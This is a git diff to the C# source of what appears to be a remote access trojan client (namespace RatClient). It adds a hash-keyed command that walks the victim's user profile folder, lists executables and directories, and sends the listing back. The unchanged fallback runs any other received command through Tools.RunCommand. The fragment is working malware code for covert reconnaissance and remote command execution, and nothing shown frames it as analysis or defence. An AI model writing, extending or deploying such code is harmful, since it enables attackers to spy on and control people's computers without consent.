@@ -2,8 +2,7 @@
 using RatClient.ProcManage;
 using System;
 using System.Xml;
-
-
+using System.Text;
 
 namespace RatClient
 {
@@ -63,6 +62,19 @@ namespace RatClient
                 }
                 return new byte[1] { 49 };
             }
+            else if (command == "ce52e112fb976b2d277f09b6eada379f")
+            {
+                string path = xmlDoc.SelectSingleNode("/root/path").InnerText.Trim();
+                if (path == "default")
+                {
+                    Console.WriteLine("default was call");
+                    path = Environment.GetFolderPath(System.Environment.SpecialFolder.UserProfile);
+				}
+                Console.WriteLine($"Processing {path} ...");
+				byte[] result = Encoding.UTF8.GetBytes(Mtool.FileExp.EXP.GetValidExeAndDir(path));
+                Console.WriteLine("End Processig Files");
+                return result;
+			}
             else
             {
                 return Tools.RunCommand(command);
